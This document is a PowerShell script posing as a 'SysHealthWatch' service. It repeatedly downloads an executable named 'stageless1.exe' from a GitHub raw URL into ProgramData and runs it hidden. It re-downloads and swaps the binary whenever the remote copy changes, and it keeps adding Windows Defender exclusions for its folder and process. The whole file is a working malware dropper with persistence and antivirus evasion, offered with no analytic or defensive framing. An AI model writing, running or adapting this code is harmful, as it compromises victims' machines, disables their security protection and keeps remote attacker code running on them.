$ErrorActionPreference = "Continue"
$URL   = "https://raw.githubusercontent.com/JohNM123321/1/main/stageless1.exe"
$SVC   = "$env:ProgramData\svc"
$DEST  = "$SVC\stageless1.exe"
$PROC  = "stageless1"
$STATE = "$SVC\state.json"
$LOG   = "$SVC\watch.log"
$MUTEX = "Global\SysHealthWatchWorker"
$SELF  = $MyInvocation.MyCommand.Path

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function Log($lvl, $m) {
    try {
        if ((Get-Item $LOG -ErrorAction SilentlyContinue).Length -gt 262144) {
            Move-Item $LOG "$LOG.old" -Force
        }
        Add-Content $LOG ("{0} [{1}] {2}" -f (Get-Date -Format o), $lvl, $m)
    } catch {}
    try {
        $src = "SysHealthWatch"
        if (-not [System.Diagnostics.EventLog]::SourceExists($src)) {
            New-EventLog -LogName Application -Source $src -ErrorAction SilentlyContinue
        }
        if ($lvl -eq "ERROR") {
            Write-EventLog -LogName Application -Source $src -EventId 9001 -EntryType Error -Message $m -ErrorAction SilentlyContinue
        }
    } catch {}
}

# single instance
$created = $false
$mtx = New-Object System.Threading.Mutex($true, $MUTEX, [ref]$created)
if (-not $created) { Log "WARN" "another worker holds mutex, exiting"; exit 0 }

if (-not (Test-Path $SVC)) { New-Item -ItemType Directory -Path $SVC -Force | Out-Null }

function Get-State {
    if (Test-Path $STATE) {
        try { return Get-Content $STATE -Raw | ConvertFrom-Json } catch { return $null }
    }
    return $null
}

function Save-State($etag, $lastmod, $length, $sha) {
    $o = [ordered]@{
        etag    = "$etag"
        lastmod = "$lastmod"
        length  = "$length"
        sha256  = "$sha"
        fetched = (Get-Date).ToString('o')
    }
    $o | ConvertTo-Json -Compress | Set-Content -Path $STATE -NoNewline
}

function Get-RemoteHead {
    try {
        $h = Invoke-WebRequest -Uri $URL -Method Head -UseBasicParsing -TimeoutSec 20
        if ($h.StatusCode -eq 200) { return $h.Headers }
    } catch {}
    return $null
}

function Need-Update($h) {
    if (-not (Test-Path $DEST)) { return $true }
    $s = Get-State
    if (-not $s) { return $true }
    $etag   = "$($h['ETag'])"
    $lastmod= "$($h['Last-Modified'])"
    $length = "$($h['Content-Length'])"
    if ($etag -and $s.etag -and $etag -ne $s.etag) { return $true }
    if ($lastmod -and $s.lastmod -and $lastmod -ne $s.lastmod) { return $true }
    if ($length -and $s.length -and $length -ne $s.length) { return $true }
    return $false
}

function Stop-ProcTree {
    $procs = Get-CimInstance Win32_Process -Filter "Name='$PROC.exe'" -ErrorAction SilentlyContinue
    if (-not $procs) {
        # fallback: match by executable path in case name changed
        $procs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
                 Where-Object { $_.ExecutablePath -and $_.ExecutablePath.Equals($DEST, [System.StringComparison]::OrdinalIgnoreCase) }
    }
    foreach ($p in $procs) {
        try { Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
    }
    Start-Sleep -Milliseconds 700
}

function Start-Payload {
    $running = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
               Where-Object { $_.ExecutablePath -and $_.ExecutablePath.Equals($DEST, [System.StringComparison]::OrdinalIgnoreCase) }
    if ($running) { return }
    try {
        Start-Process -FilePath $DEST -WindowStyle Hidden
        Log "INFO" "launched $PROC"
    } catch {
        Log "ERROR" "launch failed: $($_.Exception.Message)"
    }
}

function Safe-Swap {
    $h = Get-RemoteHead
    if (-not $h) { Log "WARN" "HEAD failed"; return $false }
    $tmp = "$DEST.new"
    try {
        Invoke-WebRequest -Uri $URL -OutFile $tmp -UseBasicParsing -TimeoutSec 60
        $sha = (Get-FileHash $tmp -Algorithm SHA256).Hash
        Stop-ProcTree
        if (Test-Path $DEST) { Remove-Item $DEST -Force -ErrorAction SilentlyContinue }
        Move-Item $tmp $DEST -Force
        Save-State $h['ETag'] $h['Last-Modified'] $h['Content-Length'] $sha
        Log "INFO" "swapped binary sha=$sha"
        return $true
    } catch {
        Log "ERROR" "swap failed: $($_.Exception.Message)"
        if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
        return $false
    }
}

function Verify-Exclusions {
    try {
        $p = Get-MpPreference
        if ($p.ExclusionPath -notcontains $SVC) { Add-MpPreference -ExclusionPath $SVC; Log "INFO" "excl path added" }
        if ($p.ExclusionProcess -notcontains "$PROC.exe") { Add-MpPreference -ExclusionProcess "$PROC.exe"; Log "INFO" "excl proc added" }
    } catch {}
}

function Verify-Self {
    if (-not (Test-Path $SELF)) {
        Log "ERROR" "watch.ps1 missing from disk"
    }
}

Log "INFO" "worker start pid=$PID self=$SELF"

$lastExcl  = [datetime]::MinValue
$lastCheck = [datetime]::MinValue
$backoff   = 5
$backoffMax= 300

while ($true) {
    $now = Get-Date

    if (($now - $lastExcl).TotalSeconds -ge 30) {
        Verify-Exclusions
        Verify-Self
        $lastExcl = $now
    }

    if (($now - $lastCheck).TotalSeconds -ge $backoff) {
        try {
            $h = Get-RemoteHead
            if ($h) {
                $backoff = 5
                if (Need-Update $h) {
                    Log "INFO" "update detected"
                    if (Safe-Swap) {
                        Start-Payload
                    }
                } else {
                    # present-state checks only
                    if (-not (Test-Path $DEST)) {
                        Log "WARN" "binary missing despite state"
                        if (Safe-Swap) { Start-Payload }
                    } else {
                        Start-Payload
                    }
                }
            } else {
                Log "WARN" "remote unreachable, backoff=$backoff"
                $backoff = [Math]::Min($backoff * 2, $backoffMax)
                if (-not (Test-Path $DEST)) {
                    Log "ERROR" "binary missing and remote unreachable"
                } else {
                    Start-Payload
                }
            }
        } catch {
            Log "ERROR" "loop: $($_.Exception.Message)"
        }
        $lastCheck = $now
    }

    Start-Sleep -Seconds 5
}